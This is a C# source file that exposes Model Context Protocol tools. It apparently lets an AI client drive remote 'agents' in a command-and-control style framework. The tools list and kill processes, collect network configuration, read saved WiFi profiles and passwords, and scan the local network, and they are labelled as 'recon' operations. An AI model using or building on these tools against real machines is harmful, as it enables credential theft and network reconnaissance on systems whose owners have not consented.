using System.ComponentModel;
using ModelContextProtocol.Server;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Mcp;

[McpServerToolType]
public sealed class SystemTools
{
    [McpServerTool, Description("Get the list of running processes on an agent")]
    public static async Task<string> get_processes(
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId)
    {
        return await McpUtils.RelayOrError(relay, agents, agentId, "recon", new { op = "processes" }, TimeSpan.FromSeconds(30));
    }

    [McpServerTool, Description("Kill a process by PID on an agent")]
    public static async Task<string> kill_process(
        TaskService taskService,
        AgentService agents,
        [Description("Target agent ID")] string agentId,
        [Description("Process ID to kill")] int pid)
    {
        return await McpUtils.CreateTaskAndWait(
            taskService, agents, agentId, CommandType.Kill, pid.ToString(), 10);
    }

    [McpServerTool, Description("Get network configuration (interfaces, WAN, WiFi, proxy) from an agent")]
    public static async Task<string> get_network_info(
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId)
    {
        return await McpUtils.RelayOrError(relay, agents, agentId, "recon", new { op = "network" }, TimeSpan.FromSeconds(30));
    }

    [McpServerTool, Description("Scan saved WiFi profiles and passwords on an agent")]
    public static async Task<string> scan_wifi(
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId)
    {
        return await McpUtils.RelayOrError(relay, agents, agentId, "recon", new { op = "network.wifi" }, TimeSpan.FromSeconds(30));
    }

    [McpServerTool, Description("Scan the LAN for nearby devices via ARP/ICMP")]
    public static async Task<string> scan_lan(
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId)
    {
        return await McpUtils.RelayOrError(relay, agents, agentId, "recon", new { op = "lanscan" }, TimeSpan.FromSeconds(60));
    }
}
